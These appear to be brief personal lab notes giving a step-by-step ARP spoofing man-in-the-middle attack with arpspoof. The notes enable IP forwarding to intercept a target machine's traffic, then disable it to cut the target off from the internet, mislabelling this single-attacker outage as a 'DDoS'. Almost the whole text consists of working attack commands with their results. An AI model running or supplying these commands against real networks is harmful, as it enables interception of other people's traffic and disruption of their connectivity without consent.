
MAC addr Usurpation (man in the middle)

* Local:
$ route -n
$ ifconfig -a
$ sudo su
# echo "1" > /proc/sys/net/ipv4/ip_forward
>>> ip forwarding enabled

* Distant:
$ arp -a

* Local:
$ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1

* Distant:
$ arp -a
>>> all traffic now passes through the local machine.

* Local:
$ sudo su
# echo "0" > /proc/sys/net/ipv4/ip_forward
>>> no ip forwarding anymore.
$ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1

The distance machine suffers now a DDoS attack. No internet connection at all.

* Local:
Ctrl-C in arpspoof to restore the initial ARP table.
>>> Ouf, attack ended ;) !

